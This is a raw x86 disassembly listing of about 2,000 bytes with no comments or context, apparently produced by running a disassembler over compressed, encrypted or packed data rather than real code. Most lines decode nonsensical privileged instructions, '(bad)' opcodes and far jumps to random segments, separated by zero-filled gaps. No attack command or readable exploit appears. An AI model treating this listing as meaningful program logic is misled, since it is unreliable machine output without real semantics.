  43c2c4:	ficom  WORD PTR [edi+0x51]
  43c2c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c2c8:	inc    edi
  43c2c9:	dec    edi
  43c2ca:	pop    ebp
  43c2cb:	push   ebx
  43c2cc:	repz dec esi
  43c2ce:	or     eax,0x50e9be53
  43c2d3:	pushf  
  43c2d4:	gs dec edi
  43c2d6:	cmp    DWORD PTR [esi],edx
  43c2d8:	dec    ebp
  43c2d9:	jns    0x43c2da
  43c2db:	mov    dh,0x3e
  43c2dd:	inc    edx
  43c2de:	add    DWORD PTR [ecx-0x70fff07c],edi
  43c2e4:	add    ecx,0xc0998743
  43c2ea:	push   ebx
  43c2eb:	bound  esp,QWORD PTR [esp+eax*4-0x6]
  43c2ef:	xchg   ebp,eax
  43c2f0:	ror    esi,0x7c
  43c2f3:	int    0xe
  43c2f5:	aam    0x53
  43c2f7:	xchg   ecx,eax
	...
  43c314:	add    BYTE PTR [eax],al
  43c316:	push   esi
  43c317:	dec    edi
  43c318:	cli    
  43c319:	jmp    0xeee20394
  43c31e:	xor    al,0x86
  43c320:	out    dx,eax
  43c321:	ins    BYTE PTR es:[edi],dx
  43c322:	aas    
  43c323:	ror    DWORD PTR [esi],cl
  43c325:	ror    DWORD PTR [edx-0x68],1
  43c328:	cli    
  43c329:	(bad)  
  43c32a:	sbb    BYTE PTR [eax-0x3e],al
  43c32d:	out    0xb2,eax
  43c32f:	js     0x43c370
  43c331:	jmp    0x31853ae2
  43c336:	cmp    BYTE PTR [ebp+0x2d],cl
  43c339:	mov    edi,0x646fd196
  43c33e:	aas    
  43c33f:	rcl    DWORD PTR [edx],cl
  43c341:	jb     0x43c37f
  43c343:	rcl    DWORD PTR [bx+si-0x1c],1
  43c347:	dec    ecx
  43c348:	sub    DWORD PTR [ecx+0x1686fa5d],0x61
  43c34f:	lds    dx,DWORD PTR [eax-0x2c]
  43c353:	dec    ecx
  43c354:	sub    DWORD PTR [ecx-0x117910a6],0x70
  43c35b:	inc    DWORD PTR [esi+0x2efeb49e]
  43c361:	sub    DWORD PTR [eax+ebp*4-0x112ccfaa],edx
  43c368:	jmp    DWORD PTR [ecx+0x4a]
  43c36b:	out    dx,al
  43c36c:	mov    bh,0x39
  43c36e:	push   cs
  43c36f:	add    BYTE PTR [eax],al
  43c371:	add    BYTE PTR [edi],cl
  43c373:	mov    esp,0xbd0f376e
  43c378:	outs   dx,BYTE PTR ds:[esi]
  43c379:	xor    eax,DWORD PTR [eax]
	...
  43c397:	add    BYTE PTR [ecx+0x2400c2d2],ch
  43c39d:	add    al,BYTE PTR [edi]
  43c39f:	mov    bh,0xf6
  43c3a1:	in     al,dx
  43c3a2:	(bad)  
  43c3a3:	jge    0x43c3a2
  43c3a5:	pop    edi
  43c3a6:	xor    eax,esi
  43c3a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c3a9:	push   es
  43c3aa:	add    esi,0xf
  43c3ad:	stc    
  43c3ae:	add    dh,0x82
  43c3b1:	in     al,dx
  43c3b2:	jmp    0x352a:0xb97cf672
  43c3b9:	imul   DWORD PTR [ebp-0x17fd7140]
  43c3bf:	mov    ecx,0x8bf5a6ff
  43c3c4:	stc    
  43c3c5:	and    ecx,DWORD PTR [eax-0x124efbb]
  43c3cb:	(bad)
  43c3ce:	add    BYTE PTR [edi],cl
  43c3d0:	xor    cl,BYTE PTR [esi-0x3d4899e2]
  43c3d6:	pusha  
  43c3d7:	xor    DWORD PTR [ebp+eiz*1+0x5e],0xffffff89
  43c3dc:	repz dec edi
  43c3de:	add    eax,0xe29164b7
  43c3e3:	sbb    bh,dl
  43c3e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c3e6:	cmc    
  43c3e7:	mov    DWORD PTR [ebx],esi
  43c3e9:	push   esp
  43c3ea:	add    eax,0x20
  43c3ed:	jns    0x43c468
  43c3ef:	jge    0x43c46d
  43c3f1:	add    DWORD PTR [ebx+0x3a52381d],eax
  43c3f7:	add    BYTE PTR [eax-0x9],ah
  43c3fa:	popa   
  43c3fb:	adc    BYTE PTR [eax],al
	...
  43c419:	add    bl,ch
  43c41b:	cmp    eax,0x8da38d02
  43c420:	dec    edx
  43c421:	inc    DWORD PTR [edi]
  43c423:	test   BYTE PTR [esi-0x2e25f2f4],bh
  43c429:	or     ecx,DWORD PTR ds:0x11660833
  43c42f:	(bad)  
  43c430:	leave  
  43c431:	or     ebx,DWORD PTR [eax+0x224faaa6]
  43c437:	jmp    0x13ca:0x1e09c383
  43c43e:	xchg   DWORD PTR [esi+ebp*8+0x224780fa],ebx
  43c445:	add    ch,BYTE PTR cs:[edx+ebx*1-0x73]
  43c44a:	push   edx
  43c44b:	push   ebp
  43c44c:	leave  
  43c44d:	pop    ss
  43c44e:	in     eax,0xfa
  43c450:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c451:	cli    
  43c452:	jmp    0xfacd:0x917d1d6
  43c459:	cs int 0x1
  43c45c:	sti    
  43c45d:	or     bl,BYTE PTR [ebx+0x5287fc1b]
  43c463:	push   esi
  43c464:	gs add al,0xb5
  43c467:	mov    ds:0xe1bafaac,al
  43c46c:	retf   0x270f
  43c46f:	xrelease mov BYTE PTR [edx+0x3],al
  43c473:	out    0xa9,eax
  43c475:	cli    
  43c476:	mov    esi,0x8e1fd095
  43c47b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c47c:	daa    
  43c47d:	sti    
	...
  43c49a:	add    BYTE PTR [eax],al
  43c49c:	sbb    BYTE PTR [ebx],al
  43c49e:	stos   BYTE PTR es:[edi],al
  43c49f:	cli    
  43c4a0:	pop    esi
  43c4a1:	pop    ebp
  43c4a2:	mov    WORD PTR [ecx+ebp*1+0x5a],es
  43c4a6:	iret   
  43c4a7:	pop    ds
  43c4a8:	mov    fs,WORD PTR [edx-0x18f39a05]
  43c4ae:	test   eax,0x513239e7
  43c4b3:	cli    
  43c4b4:	adc    cl,BYTE PTR [esi]
  43c4b6:	stos   DWORD PTR es:[edi],eax
  43c4b7:	adc    edx,DWORD PTR [edx-0x1d]
  43c4ba:	pop    ebx
  43c4bb:	stc    
  43c4bc:	push   edx
  43c4bd:	jmp    DWORD PTR [ecx+0x0]
  43c4c0:	or     eax,0x5080e900
  43c4c5:	shl    edx,cl
  43c4c7:	mov    bh,BYTE PTR [edi+0x3a815bef]
  43c4cd:	dec    ebp
  43c4ce:	inc    ecx
  43c4cf:	push   edi
  43c4d0:	xor    dl,BYTE PTR [esi]
  43c4d2:	not    DWORD PTR [ebp+0x27]
  43c4d5:	js     0x43c500
  43c4d7:	ins    DWORD PTR es:[edi],dx
  43c4d8:	cmp    ecx,DWORD PTR [ebp+0x29]
  43c4db:	push   edi
  43c4dc:	mov    ecx,0x5cb31478
  43c4e1:	(bad)  
  43c4e3:	mov    bl,0x6a
  43c4e5:	sub    al,0x3
  43c4e8:	or     eax,0x68b2e6d6
  43c4ed:	add    DWORD PTR [ecx-0x56fff2fd],edx
  43c4f3:	push   esi
  43c4f4:	pop    ecx
  43c4f5:	clc    
  43c4f6:	icebp  
  43c4f7:	lock sbb ch,dh
  43c4fa:	test   al,0x3
  43c4fc:	mov    dl,BYTE PTR [eax+0x65]
  43c4ff:	push   ebp
	...
  43c51c:	add    BYTE PTR [eax],al
  43c51e:	(bad)  
  43c51f:	aam    0x12
  43c521:	sbb    eax,0xfb5cfc60
  43c526:	cmc    
  43c527:	lods   al,BYTE PTR ds:[esi]
  43c528:	clc    
  43c529:	iret   
  43c52a:	sbb    al,0xaf
  43c52c:	jae    0x43c4ee
  43c52e:	sbb    dh,BYTE PTR [eax+0x4b12d0b9]
  43c534:	cmp    ecx,DWORD PTR [eax]
  43c536:	aas    
  43c537:	dec    ebx
  43c538:	rol    edi,cl
  43c53a:	add    al,al
  43c53c:	call   0xe7188fc1
  43c541:	xchg   edx,eax
  43c542:	or     eax,0xef091b2
  43c547:	out    dx,eax
  43c548:	sub    BYTE PTR [ecx*4+0x12cfe747],al
  43c54f:	dec    ebx
  43c550:	repz or esi,DWORD PTR [ebp+0x73]
  43c554:	jmp    FWORD PTR [esi]
  43c556:	ret    
  43c557:	inc    ebp
  43c558:	pop    ecx
  43c559:	arpl   di,cx
  43c55b:	mov    cl,0x5c
  43c55d:	sub    edx,DWORD PTR [edx]
  43c55f:	add    BYTE PTR [ebp+0x72],dl
  43c562:	stos   BYTE PTR es:[edi],al
  43c563:	scas   eax,DWORD PTR es:[edi]
  43c564:	push   eax
  43c565:	mov    esi,0xb652471f
  43c56a:	and    al,0x4a
  43c56c:	push   ecx
  43c56d:	rcl    DWORD PTR [ecx],cl
  43c56f:	fdivr  st,st(7)
  43c571:	call   0xbd3e4584
  43c576:	push   es
  43c577:	inc    edi
  43c578:	adc    al,0xa9
  43c57a:	sbb    al,0xb
  43c57c:	add    BYTE PTR [eax-0x38],dh
  43c57f:	add    bh,BYTE PTR [edi+0x21]
	...
  43c59e:	add    BYTE PTR [eax],al
  43c5a0:	pop    ebx
  43c5a1:	iret   
  43c5a2:	outs   dx,DWORD PTR ds:[esi]
  43c5a3:	lds    edx,FWORD PTR fs:[edx+0x50]
  43c5a7:	mov    ecx,0xdb37f45b
  43c5ac:	into   
  43c5ad:	dec    edx
  43c5ae:	sub    DWORD PTR [ecx],0xffffffd2
  43c5b1:	mov    dl,0x38
  43c5b3:	je     0x43c5f7
  43c5b5:	aam    0x4e
  43c5b7:	(bad)  
  43c5b8:	int    0x52
  43c5ba:	mov    BYTE PTR [edi],ch
  43c5bc:	or     eax,0xd54c313
  43c5c1:	jns    0x43c5fc
  43c5c3:	ret    0xe21c
  43c5c6:	add    eax,DWORD PTR [ecx+0x9]
  43c5c9:	adc    BYTE PTR [eax],al
  43c5cb:	jmp    0xd53e732e
  43c5d0:	repnz out dx,eax
  43c5d2:	aas    
  43c5d3:	jmp    0xa67ac65f
  43c5d8:	mov    ebp,0x5274531a
  43c5dd:	add    dl,BYTE PTR [ecx-0x62]
  43c5e0:	push   ebx
  43c5e1:	dec    BYTE PTR [edi-0x6a]
  43c5e4:	dec    ebx
  43c5e5:	add    bh,bl
  43c5e7:	hlt    
  43c5e8:	mov    dl,0xfc
  43c5ea:	aas    
  43c5eb:	add    BYTE PTR [ecx+ecx*8-0x46],dh
  43c5ef:	je     0x43c661
  43c5f1:	ja     0x43c636
  43c5f3:	or     BYTE PTR [edi+0x6874fe8c],bl
  43c5f9:	outs   dx,BYTE PTR ds:[esi]
  43c5fa:	(bad)  
  43c5fb:	jmp    0xfe34:0x7ffa5c0d
  43c602:	dec    esi
  43c603:	inc    DWORD PTR [eax]
	...
  43c621:	add    BYTE PTR [edx],bl
  43c623:	mov    ch,0x13
  43c625:	shl    BYTE PTR ds:0x6afefa3e,1
  43c62b:	div    dh
  43c62d:	adc    eax,0x3a4f28
  43c632:	push   ss
  43c633:	mov    esi,0xffe6c955
  43c638:	call   DWORD PTR [ebp+0x7f]
  43c63b:	mov    ah,0x81
  43c63d:	push   es
  43c63e:	imul   eax,esp,0xfd8c0e6e
  43c644:	jg     0x43c646
  43c646:	in     al,0x57
  43c648:	cli    
  43c649:	dec    edi
  43c64a:	adc    ebx,DWORD PTR [ecx-0x36]
  43c64d:	adc    DWORD PTR [ebp+edi*8-0x3513897e],esi
  43c654:	lock je 0x43c642
  43c657:	fwait
  43c658:	cmc    
  43c659:	adc    eax,0x3a50b8
  43c65e:	add    bh,BYTE PTR [edi+0x7ed08b53]
  43c664:	out    0x10,al
  43c666:	test   al,0xfd
  43c668:	call   DWORD PTR [edx+0xa]
  43c66b:	fwait
  43c66c:	mov    eax,DWORD PTR [ebp-0xa579c]
  43c672:	hlt    
  43c673:	pop    ebx
  43c674:	lock add BYTE PTR [ebp+edi*8+0x505815f6],ah
  43c67c:	cmp    al,BYTE PTR [eax]
  43c67e:	cmp    al,0xf1
  43c680:	hlt    
  43c681:	add    BYTE PTR ds:0x72fe57,cl
	...
  43c6a3:	add    cl,ah
  43c6a5:	and    eax,0x4ee0fa4c
  43c6aa:	data16 daa 
  43c6ac:	xor    al,0xca
  43c6ae:	push   ebx
  43c6af:	dec    edi
  43c6b0:	in     eax,0x2
  43c6b2:	sar    BYTE PTR [edi],1
  43c6b4:	or     eax,0xcd89cfff
  43c6b9:	push   esi
  43c6ba:	xchg   edi,eax
  43c6bb:	add    ecx,DWORD PTR [edi+edx*2]
  43c6be:	dec    BYTE PTR [eax+edi*2+0x32fa51af]
  43c6c5:	mov    edi,0xc22a8fc1
  43c6ca:	jg     0x43c68f
  43c6cc:	std    
  43c6cd:	aad    0x56
  43c6cf:	cli    
  43c6d0:	mov    eax,ds:0xbdc28751
  43c6d5:	stos   DWORD PTR es:[edi],eax
  43c6d6:	jns    0x43c6c7
  43c6d8:	push   es
  43c6d9:	and    dl,BYTE PTR [edi+ecx*2+0x2]
  43c6dd:	je     0x43c6e1
  43c6df:	call   0xfa98bba6
  43c6e4:	mov    BYTE PTR [esi],dl
  43c6e6:	retf   
  43c6e7:	pop    ds
  43c6e8:	ja     0x43c741
  43c6ea:	out    0x7f,al
  43c6ec:	or     eax,0xc65fe57
  43c6f1:	jge    0x43c6f1
  43c6f3:	gs or  al,0x7f
  43c6f6:	(bad)  
  43c6f7:	dec    DWORD PTR ds:0x11744e97
  43c6fd:	sub    bh,al
  43c6ff:	aas    
  43c700:	pop    ds
  43c701:	pop    ss
  43c702:	add    al,0x7f
  43c704:	mov    ch,0x39
  43c706:	fmul   DWORD PTR ds:0x0
	...
  43c724:	add    BYTE PTR [eax],al
  43c726:	push   ebx
  43c727:	fmul   DWORD PTR [ebp-0x39]
  43c72a:	or     eax,0x836dfe57
  43c72f:	inc    esp
  43c730:	ds pop edx
  43c732:	xor    ebp,esi
  43c734:	cmp    al,0xbd
  43c736:	adc    eax,0x87b3e900
  43c73b:	repnz in al,0xf6
  43c73e:	cmp    al,BYTE PTR [eax]
  43c740:	pop    ecx
  43c741:	add    eax,0x7f33596a
  43c746:	jbe    0x43c7c6
  43c748:	xchg   esp,eax
  43c749:	hlt    
  43c74a:	push   cs
  43c74b:	add    cl,ch
  43c74d:	mov    dh,0xbc
  43c74f:	mov    al,0x63
  43c751:	mov    DWORD PTR [edx+0x44],esp
  43c754:	imul   edx,DWORD PTR [ebx-0x26],0xd045ad7
  43c75b:	add    BYTE PTR [edx-0x7],bl
  43c75e:	out    dx,al
  43c75f:	in     al,dx
  43c760:	test   al,0x3
  43c762:	lds    ecx,FWORD PTR [edx]
  43c764:	push   esp
  43c765:	add    al,0xd
  43c767:	add    BYTE PTR [edx+0x5051f3b8],bh
  43c76d:	mov    edx,esi
  43c76f:	dec    eax
  43c770:	xor    DWORD PTR [edx+ebp*4+0xac3b4db],esi
  43c777:	loopne 0x43c7e9
  43c779:	add    BYTE PTR [edx+0x0],0x5e
  43c77d:	or     BYTE PTR [eax+eax*1],cl
  43c780:	jmp    0xb8c7905
  43c785:	push   ebx
  43c786:	out    0x58,eax
  43c788:	dec    esi
  43c789:	add    DWORD PTR [eax],0x0
	...
  43c7a8:	out    0x47,eax
  43c7aa:	gs dec eax
  43c7ac:	push   es
  43c7ad:	xor    eax,0x52
  43c7b0:	pop    esi
  43c7b1:	sbb    ebx,DWORD PTR [esi+0x4b]
  43c7b4:	pop    edx
  43c7b5:	jne    0x43c822
  43c7b7:	push   ebx
  43c7b8:	mov    ebx,0xb7b3d947
  43c7bd:	int    0xe0
  43c7bf:	pop    ebx
  43c7c0:	push   ds
  43c7c1:	(bad)  
  43c7c2:	retf   0x9152
  43c7c5:	inc    eax
  43c7c6:	cmp    al,0x3
  43c7c8:	sub    eax,DWORD PTR [eax]
  43c7ca:	mov    edx,0xff4712d8
  43c7cf:	fstp   TBYTE PTR [edx-0xb]
  43c7d2:	aas    
  43c7d3:	jmp    0xf6b84f6d
  43c7d8:	push   esp
  43c7d9:	(bad)  
  43c7da:	stc    
  43c7db:	add    eax,0xa92d9463
  43c7e0:	mov    edi,0xd0a056a9
  43c7e5:	add    al,BYTE PTR [eax]
  43c7e7:	cmp    DWORD PTR [ecx],ecx
  43c7e9:	pop    edi
  43c7ea:	hlt    
  43c7eb:	fs into 
  43c7ed:	rcr    BYTE PTR [edx],cl
  43c7ef:	jp     0x3a37f204
  43c7f5:	cli    
  43c7f6:	mov    dl,0xb1
  43c7f8:	or     dl,ah
  43c7fa:	test   BYTE PTR [eax],dh
  43c7fc:	(bad)  
  43c7fd:	sti    
  43c7fe:	jle    0x43c850
  43c800:	in     al,dx
  43c801:	int3   
  43c802:	push   es
  43c803:	(bad)  
  43c804:	xchg   ebx,eax
  43c805:	iret   
  43c806:	add    ebp,ecx
  43c808:	inc    ebp
  43c809:	add    ebp,DWORD PTR [edi]
  43c80b:	sub    DWORD PTR [eax],eax
	...
  43c829:	add    BYTE PTR [esi-0x7a],cl
  43c82c:	cs sub ebx,ecx
  43c82f:	mov    ch,0x54
  43c831:	(bad)  
  43c832:	jmp    0x2dab:0xc7bf0c22
  43c839:	inc    edx
  43c83a:	pop    edi
  43c83b:	in     al,dx
  43c83c:	arpl   dx,di
  43c83e:	into   
  43c83f:	inc    esi
  43c840:	test   DWORD PTR [ecx],ebx
  43c842:	xchg   ebp,eax
  43c843:	push   eax
  43c844:	je     0x43c831
  43c846:	arpl   WORD PTR [edx+ecx*1+0x36],cx
  43c84a:	add    al,0xc7
  43c84c:	not    DWORD PTR [ebp-0xe810346]
  43c852:	in     al,dx
  43c853:	retf   
  43c854:	add    al,0x4f
  43c856:	mov    al,BYTE PTR [esi+0x4f380d74]
  43c85c:	cs test eax,0xe788e07a
  43c862:	cmp    eax,0xc60047ec
  43c867:	inc    edx
  43c868:	cli    
  43c869:	or     ah,0xb0
  43c86c:	jae    0x43c87b
  43c86e:	dec    esi
  43c86f:	cld    
  43c870:	push   esp
  43c871:	jmp    DWORD PTR [ecx+0x6e]
  43c874:	or     al,0x40
  43c876:	je     0x43c8f5
  43c878:	mov    edx,0xa6a66eb
  43c87d:	je     0x43c8ea
  43c87f:	pop    eax
  43c880:	cmp    edi,0x0
  43c883:	inc    esp
  43c884:	pusha  
  43c885:	mov    DWORD PTR [edx+0x7b],ecx
  43c888:	rol    BYTE PTR [edx],0x7f
  43c88b:	jbe    0x43c836
  43c88d:	add    DWORD PTR [eax],eax
	...
  43c8ab:	add    bl,bh
  43c8ad:	xchg   ecx,eax
  43c8ae:	pop    ebx
  43c8af:	mov    dh,BYTE PTR [edi-0x6c]
  43c8b2:	mov    esp,0x818d3404
  43c8b7:	in     al,dx
  43c8b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c8b9:	xlat   BYTE PTR ds:[ebx]
  43c8ba:	repnz or eax,0x34fffe93
  43c8c1:	mov    BYTE PTR [ebp+0x68],cl
  43c8c4:	push   0x9f003a39
  43c8c9:	mov    edx,0x1e608d4d
  43c8ce:	adc    BYTE PTR [eax+0x4c],dl
  43c8d1:	inc    ecx
  43c8d2:	(bad)  
  43c8d4:	sub    edi,DWORD PTR [ebp-0x46]
  43c8d7:	je     0x43c887
  43c8d9:	(bad)  
  43c8da:	jle    0x43c900
  43c8dc:	hlt    
  43c8dd:	sti    
  43c8de:	(bad)  
  43c8df:	jmp    DWORD PTR [esi+eax*8-0x6e27dbc2]
  43c8e6:	cmc    
  43c8e7:	adc    eax,0x3a4bb4
  43c8ec:	outs   dx,DWORD PTR ds:[esi]
  43c8ed:	lods   al,BYTE PTR ds:[esi]
  43c8ee:	jns    0x43c8ee
  43c8f0:	mov    ebx,0x308d5a2d
  43c8f5:	sbb    eax,0x1a4023c
  43c8fa:	call   0x4f71d628
  43c8ff:	cli    
  43c900:	xchg   ecx,eax
  43c901:	xchg   edi,eax
  43c902:	shl    DWORD PTR [ecx],1
  43c904:	nop
  43c905:	shl    DWORD PTR [edx],cl
  43c907:	cmp    al,0xf
  43c909:	push   edi
  43c90a:	dec    BYTE PTR [edi+0x3a]
  43c90d:	fadd   st(2),st
  43c90f:	and    eax,DWORD PTR [eax]
	...
  43c92d:	add    BYTE PTR ds:0x6dff5be7,bl
  43c933:	popf   
  43c934:	dec    edi
  43c935:	test   BYTE PTR [ebp-0x15],cl
  43c938:	lock icebp 
  43c93a:	mov    DWORD PTR [ebx],esi
  43c93c:	out    dx,al
  43c93d:	std    
  43c93e:	push   0x57
  43c940:	out    dx,al
  43c941:	jae    0x43c959
  43c943:	int3   
  43c944:	mov    edx,0x766f0523
  43c949:	cli    
  43c94a:	push   edx
  43c94b:	into   
  43c94c:	pop    ebx
  43c94d:	add    eax,0x8281b98
  43c952:	(bad)  [esi-0x59c4c187]
  43c958:	jns    0x43c8dd
  43c95a:	jmp    0xd43cda5
  43c95f:	xchg   DWORD PTR [eax-0xbad0706],edi
  43c965:	aas    
  43c966:	or     eax,0x6a743edc
  43c96b:	gs dec edi
  43c96d:	adc    al,0x19
  43c96f:	sub    DWORD PTR [esi-0x1289501],edi
  43c975:	dec    DWORD PTR ds:0x29144f8e
  43c97b:	dec    ecx
  43c97c:	mov    esi,0xf1f643ff
  43c981:	xlat   BYTE PTR ds:[ebx]
  43c982:	cld    
  43c983:	xchg   esi,eax
  43c984:	inc    BYTE PTR [ebp+ecx*8-0x326b009b]
  43c98b:	ins    BYTE PTR es:[edi],dx
  43c98c:	jnp    0x43c972
  43c98e:	push   0x427c1a
	...
  43c9af:	add    BYTE PTR [ecx],al
  43c9b1:	add    BYTE PTR [esi],dh
  43c9b3:	mov    dh,0x93
  43c9b5:	retf   
  43c9b6:	and    ah,cl
  43c9b8:	mov    bl,0x4d
  43c9ba:	adc    eax,0xf0a5e52b
  43c9bf:	aad    0xee
  43c9c1:	jb     0x43c9af
  43c9c3:	outs   dx,BYTE PTR ds:[esi]
  43c9c4:	fwait
  43c9c5:	mov    edx,0x78fcd808
  43c9ca:	loopne 0x43c9a5
  43c9cc:	xchg   DWORD PTR [esp+esi*1+0x28],eax
  43c9d0:	sbb    eax,0x5283b201
  43c9d5:	inc    esp
  43c9d6:	nop
  43c9d7:	(bad)  
  43c9d8:	xchg   BYTE PTR [ecx+edx*4-0x77],al
  43c9dc:	stos   BYTE PTR es:[edi],al
  43c9dd:	retf   
  43c9de:	fcmovnb st,st(2)
  43c9e0:	sbb    esp,DWORD PTR [esi+0x1036d1e0]
  43c9e6:	test   eax,0xec41bbae
  43c9eb:	add    edx,DWORD PTR [edx-0x2b853b43]
  43c9f1:	jecxz  0x43ca66
  43c9f3:	or     ch,dl
  43c9f5:	hlt    
  43c9f6:	xchg   ecx,eax
  43c9f7:	or     ch,dh
  43c9f9:	jb     0x43c9e7
  43c9fb:	test   BYTE PTR [ebx+0x4e0310fb],dl
  43ca01:	pop    eax
  43ca02:	dec    esp
  43ca03:	mov    ecx,0x90d5393
  43ca08:	fldenv ds:0xaa5a03a5
  43ca0e:	pop    ebp
  43ca0f:	sbb    DWORD PTR [ecx+0x3a8f1],edx
	...
  43ca31:	add    BYTE PTR [esi-0x2a],bl
  43ca34:	out    0x12,al
  43ca36:	imul   BYTE PTR [ebx+0x75c27ab9]
  43ca3c:	mov    ds:0x7b4352f3,eax
  43ca41:	sti    
  43ca42:	xlat   BYTE PTR ds:[ebx]
  43ca43:	int    0xd8
  43ca45:	(bad)  
  43ca47:	inc    ebx
  43ca48:	call   FWORD PTR [esi]
  43ca4a:	xchg   esp,eax
  43ca4b:	xor    DWORD PTR [ebx-0x3d],0xf
  43ca4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ca50:	or     edi,DWORD PTR [esi]
  43ca52:	xlat   BYTE PTR ds:[ebx]
  43ca53:	dec    DWORD PTR [esp-0x29b14c47]
  43ca5a:	(bad)  
  43ca5d:	hlt    
  43ca5e:	ret    0x3ff5
  43ca61:	jmp    0xe5b74deb
  43ca66:	jle    0x43ca68
  43ca68:	out    0xd9,eax
  43ca6a:	add    BYTE PTR fs:[ebx+0x16],dl
  43ca6e:	mov    edx,0x811cfaae
  43ca73:	inc    esi
  43ca74:	je     0x43ca67
  43ca76:	ret    
  43ca77:	xor    BYTE PTR ds:0x56a9bba9,ch
  43ca7d:	sub    al,0xcf
  43ca7f:	idiv   bh
  43ca81:	push   ds
  43ca82:	mov    ds:0x55726347,al
  43ca87:	adc    eax,DWORD PTR [eax]
  43ca89:	jmp    0xdd91459c
  43ca8e:	(bad)  
  43ca8f:	mov    ah,0x13
  43ca91:	jb     0x43caef
  43ca93:	sbb    edi,DWORD PTR [ecx+0x1]
	...
  43cab1:	add    BYTE PTR [eax],al
  43cab3:	add    BYTE PTR [ecx],cl
  43cab5:	add    BYTE PTR [eax],al
  43cab7:	sbb    bl,dl
  43cab9:	adc    eax,eax
  43cabb:	jge    0x43cacf
  43cabd:	loope  0x43cb3a
  43cabf:	jmp    0x43cabb
  43cac1:	pop    ds
  43cac2:	shr    DWORD PTR [esi],0xd
  43cac5:	inc    ebx
  43cac6:	repnz dec ebx
  43cac8:	pop    esi
  43cac9:	cmp    dl,0x92
  43cacc:	xchg   edx,eax
  43cacd:	mov    esp,0xf2cc7265
  43cad2:	xchg   bl,bh
  43cad4:	aad    0x27
  43cad6:	pop    edx
  43cad7:	mov    bh,0x4f
  43cad9:	lods   al,BYTE PTR ds:[esi]
  43cada:	xchg   ch,bh
  43cadc:	mov    WORD PTR [esi+0x13],ss
  43cadf:	add    ah,bh
  43cae1:	jne    0x43cad8
  43cae3:	call   ebx
  43cae5:	mov    al,ds:0xfe77de32
  43caea:	test   al,al
  43caec:	cmp    edx,edi
  43caee:	sub    eax,eax
  43caf0:	fisttp QWORD PTR [eax-0x1]
  43caf3:	jmp    DWORD PTR [esp+ebp*4-0x704af7bd]
  43cafa:	sbb    DWORD PTR ds:0x3a4dd8,0x6a0b2afb
  43cb04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43cb05:	mov    bl,0xc9
  43cb07:	mov    ds:0x3a1488,eax
  43cb0c:	jmp    0x1c6faccc
  43cb11:	aam    0x88
  43cb13:	inc    eax
  43cb14:	fs (bad) 
  43cb16:	bnd call 0x43cb1c
	...
  43cb34:	add    BYTE PTR [eax],al
  43cb36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43cb37:	mov    cl,0xf5
  43cb39:	(bad)  
  43cb3a:	out    dx,eax
  43cb3b:	repnz aaa 
  43cb3d:	fisub  WORD PTR [edi]
  43cb3f:	cld    
  43cb40:	dec    edi
  43cb41:	push   0x3ac1bc
  43cb46:	mov    WORD PTR [ebx-0x374c0008],?
  43cb4c:	or     esi,DWORD PTR [edx+edx*8]
  43cb4f:	inc    eax
  43cb50:	cli    
  43cb51:	dec    edi
  43cb52:	fadd   st(4),st
  43cb54:	in     al,dx
  43cb55:	std    
  43cb56:	ret    
  43cb57:	ja     0x43cb13
  43cb59:	jne    0x43cb86
  43cb5b:	lock mov edi,0xfffb8ee9
  43cb61:	(bad)  
  43cb62:	jp     0x43cb25
  43cb64:	jae    0x43cb52
  43cb66:	jl     0x43cbda
  43cb68:	cli    
  43cb69:	push   esp
  43cb6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43cb6c:	shl    DWORD PTR [ebx],0x33
  43cb6f:	mov    bl,0x81
  43cb71:	(bad)  
  43cb72:	mov    ah,0xb4
  43cb74:	leave  
  43cb75:	xor    ecx,DWORD PTR ds:0xc33ba0ea
  43cb7b:	xchg   esi,eax
  43cb7c:	(bad)  
  43cb7d:	ror    BYTE PTR ss:[edx-0x7e],cl
  43cb81:	xchg   esp,eax
  43cb82:	or     eax,0x86fe57
  43cb87:	mov    edi,0x7f0d3fed
  43cb8c:	xchg   BYTE PTR [ecx-0x551a8b3],cl
  43cb92:	fld    TBYTE PTR [edi+0x574d893b]
  43cb98:	dec    ebx
  43cb99:	xor    al,0x0
	...
  43cbb7:	add    cl,ah
  43cbb9:	nop
  43cbba:	mov    edi,0x2a176fff
  43cbbf:	ds or  eax,0x69673482
  43cbc5:	fnstcw WORD PTR [esi+0xa4c83ff]
  43cbcb:	fcmove st,st(6)
  43cbcd:	push   esi
  43cbce:	lahf   
  43cbcf:	inc    ebx
  43cbd0:	push   ebx
  43cbd1:	push   ss
  43cbd2:	add    al,0xfb
  43cbd4:	inc    ebx
  43cbd5:	dec    DWORD PTR [ebx-0x77]
  43cbd8:	int    0x56
  43cbda:	dec    ebx
  43cbdb:	xor    al,0x19
  43cbdd:	cdq    
  43cbde:	mov    edi,0x2a0fafff
  43cbe3:	ds or  eax,0x116734ca
  43cbe9:	mov    ds:0xe43bffbe,al
  43cbee:	pminub mm1,mm6
  43cbf1:	push   esi
  43cbf2:	lahf   
  43cbf3:	dec    ebx
  43cbf4:	dec    ebx
  43cbf5:	xchg   esi,eax
  43cbf6:	(bad)  
  43cbf7:	cli    
  43cbf8:	cmp    edi,DWORD PTR [edi]
  43cbfa:	out    0x8a,al
  43cbfc:	int    0x56
  43cbfe:	dec    ebx
  43cbff:	xor    al,0xd1
  43cc01:	loopne 0x43cbc2
  43cc03:	jmp    FWORD PTR [edi+0xd3e2c66]
  43cc09:	adc    dh,BYTE PTR ds:0x4300619e
  43cc0f:	shl    dl,0x7
  43cc12:	fadd   st(3),st
  43cc14:	les    edi,FWORD PTR [eax+ebp*8-0x33f8f52a]
  43cc1b:	mov    DWORD PTR [eax],0x0
	...
  43cc39:	add    BYTE PTR [esp+edi*4+0x6fad7e8],dh
  43cc40:	mov    esp,0xe8bce4bb
  43cc45:	xlat   BYTE PTR ds:[ebx]
  43cc46:	adc    al,BYTE PTR [edi]
  43cc48:	lods   al,BYTE PTR ds:[esi]
  43cc49:	mov    bl,0xd4
  43cc4b:	mov    esp,0x50acfe8
